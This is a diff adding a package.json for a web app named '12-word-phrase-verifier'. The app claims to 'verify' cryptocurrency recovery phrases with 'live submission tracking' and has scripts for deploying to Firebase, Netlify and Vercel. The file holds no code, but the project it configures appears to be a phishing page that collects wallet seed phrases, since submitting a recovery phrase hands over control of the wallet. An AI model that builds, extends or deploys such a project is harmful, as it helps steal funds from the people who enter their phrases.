@@ -1,0 +1,30 @@
+{
+  "name": "12-word-phrase-verifier",
+  "version": "1.0.0",
+  "description": "A responsive web app for verifying 12-word recovery phrases with live submission tracking",
+  "main": "index.html",
+  "scripts": {
+    "serve": "python -m http.server 8000",
+    "serve-node": "npx http-server",
+    "deploy:firebase": "firebase deploy",
+    "deploy:netlify": "netlify deploy",
+    "deploy:vercel": "vercel"
+  },
+  "keywords": [
+    "12-word-phrase",
+    "recovery-phrase",
+    "crypto",
+    "verification",
+    "firebase"
+  ],
+  "author": "Your Name",
+  "license": "MIT",
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/yourusername/12-word-verifier"
+  },
+  "devDependencies": {
+    "firebase-tools": "^12.0.0",
+    "http-server": "^14.0.0"
+  }
+}
